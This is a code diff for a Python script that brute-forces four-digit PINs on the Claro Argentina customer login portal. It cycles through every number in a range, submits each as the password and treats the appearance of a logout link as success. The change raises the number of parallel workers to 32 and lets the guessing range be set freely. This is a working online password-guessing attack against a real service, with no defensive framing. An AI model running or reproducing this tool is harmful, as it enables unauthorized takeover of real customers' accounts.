@@ -14,22 +14,6 @@ LOGINURL = ("""http://individuos.claro.com.ar/web/guest/bienvenido"""
     """&p_p_col_id=column-1&p_p_col_count=1&saveLastPath=0"""
     """&_58_struts_action=%2Flogin%2Flogin""")
 
-class Get_form:
-    def __init__(self):
-        self.forms = {}
-
-    @Retry(15)
-    def __call__(self, formurl):
-        if formurl not in self.forms:
-            warning("Consiguendo un formulario")
-            try:
-                response = opener.open(formurl)
-                forms = ClientForm.ParseResponse(response,
-                    backwards_compat=False)
-            except (urllib2.URLError, urllib2.HTTPError):
-                return None
-            self.forms[formurl] = forms
-        return self.forms[formurl]
 
 
 def print_dot(dot="·"):
@@ -38,35 +22,53 @@ def print_dot(dot="·"):
 
 
 class Login:
-    @Retry(10)
+
     def __init__(self):
-        try:
-            form = get_form("""http://individuos.claro.com.ar""")[0]
-        except:
-            return
+        debug("Instanciando Login")
+        cj = cookielib.CookieJar()
+        self.opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
+        self._forms = {}
+
+
+    @Retry(15, pause=2)
+    def get_forms(self, formurl=LOGINURL):
+        if formurl not in self._forms:
+            warning("Consiguendo un formulario")
+
+            try:
+                self._forms[formurl] = DEFAULTFORMS
+            except:
+
+                try:
+                    response = self.opener.open(formurl)
+                    forms = ClientForm.ParseResponse(response,
+                        backwards_compat=False)
+                except (urllib2.URLError, urllib2.HTTPError):
+                    return None
+                self._forms[formurl] = forms
+        return self._forms[formurl]
+
 
     @Retry(15, pause=2)
     def __call__(self, loginNumber, password):
         if not password % 100:
             print_dot()
 
+        form = self.get_forms(LOGINURL)[0]
         debug("Probando con %s" % password)
 
         pass_str = "%04d" % password
 
         try:
             form["_58_login"] = loginNumber
-            form["_58_password"] = password
-            html = opener.open(form.click()).read()
+            form["_58_password"] = pass_str
+            html = self.opener.open(form.click()).read()
         except (urllib2.URLError, urllib2.HTTPError):
             return None
         else:
             if '/c/portal/logout' in html:
                 debug("Encontrada: %s" % password)
                 return password
-            elif password == "6302":
-                error("Llegamos a 6302")
-                return html
             elif 'servlet/Controller?EVENT=GENERAR_PIN"' in html:
                 debug("No es %s" % password)
                 return False
@@ -78,15 +80,19 @@ class Login:
                 return html
 
 
-def main():
-    loginNumber = sys.argv[1]
+def main(opts=None, args=None):
+    sys.argv += [None, None]
+    loginNumber = sys.argv.pop(1)
+    fromnumber = sys.argv.pop(1) or 0
+    tonumber = sys.argv.pop(1) or 10000
 
 #TODO: debe verificar el servicio antes de iniciar el proceso
 
-    farm = Farm(Login, 5, True, True)
+    farm = Farm(Login, 32, True, True)
     debug("Farm created")
-
-    for number in xrange(6300, 10000):
+    
+    rango = xrange(int(fromnumber), int(tonumber))
+    for number in rango:
         farm.enqueue((loginNumber, number))
     debug("Farm populated")
 
@@ -111,9 +117,7 @@ if __name__ == "__main__":
     moreinfo = Verbose(VERBOSE -1)
     debug = Verbose(VERBOSE - 2, "D: ")
 
-    cj = cookielib.CookieJar()
-    opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
-
-    get_form = Get_form()
+    DEFAULTLOGIN = Login()
+    DEFAULFORMS = DEFAULTLOGIN.get_forms()
 
     exit(main())
